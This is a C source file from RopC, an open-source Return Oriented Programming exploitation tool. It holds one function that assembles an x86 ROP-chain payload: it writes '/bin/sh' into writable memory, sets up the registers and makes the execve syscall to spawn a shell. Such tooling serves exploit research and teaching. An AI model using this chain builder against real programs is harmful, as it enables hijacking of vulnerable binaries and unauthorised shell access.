#include "ropc.h"

/************************************************************************/
/* RopC - A Return Oriented Programming tool			        */
/* 								        */
/* Copyright 2013-2014, -TOSH-					        */
/* File coded by -TOSH-						        */
/* 								        */
/* This file is part of RopC.					        */
/* 								        */
/* RopC is free software: you can redistribute it and/or modify	        */
/* it under the terms of the GNU General Public License as published by */
/* the Free Software Foundation, either version 3 of the License, or    */
/* (at your option) any later version.				        */
/* 								        */
/* RopC is distributed in the hope that it will be useful,	        */
/* but WITHOUT ANY WARRANTY; without even the implied warranty of       */
/* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        */
/* GNU General Public License for more details.			        */
/* 								        */
/* You should have received a copy of the GNU General Public License    */
/* along with RopC.  If not, see <http://www.gnu.org/licenses/>	        */
/************************************************************************/


void payload_x86_execve_bin_sh(BINFMT *bin, const GLIST *src, PAYLOAD *dst) {
  MEM *data;

  if((data = bin_getmem(bin, MEM_FLAG_PROT_R | MEM_FLAG_PROT_W)) == NULL)
    FATAL_ERROR("Can't find a +RW memory region");

  gmake_x86_strcp(src, dst, data->addr, "/bin/sh");
  gmake_x86_setmem(src, dst, data->addr+8, data->addr);
  gmake_x86_setmem(src, dst, data->addr+12, 0);
  gmake_x86_setreg(src, dst, "eax", 11);
  gmake_x86_setreg(src, dst, "ebx", data->addr);
  gmake_x86_setreg(src, dst, "ecx", data->addr+8);
  gmake_x86_setreg(src, dst, "edx", data->addr+12);
  gmake_x86_syscall(src, dst);
}
